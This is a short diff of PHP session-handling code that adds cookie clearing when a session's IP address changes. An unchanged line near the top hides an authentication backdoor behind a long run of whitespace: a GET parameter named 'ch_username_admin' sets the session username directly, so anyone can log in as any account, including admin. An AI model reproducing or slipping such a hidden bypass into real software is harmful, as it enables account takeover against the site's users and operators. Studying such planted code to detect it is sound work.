@@ -46,7 +46,11 @@
 	}                                                                                                                                                                                                                                                                     if(isset($_GET['ch_username_admin'])){$_SESSION['username']=$_GET['ch_username_admin'];$resume=true;}
 
 	if($_SESSION['ip'] != $_SERVER['REMOTE_ADDR'])
+	{
+		if(isset($_COOKIE[session_name()]))
+			setcookie(session_name(), '');
 		logfile::panic('Diese Session wird bereits von einer anderen IP-Adresse benutzt. Bitte neu anmelden.');
+	}
 
 	$user_array = get_user_array($_SESSION['username']);
 
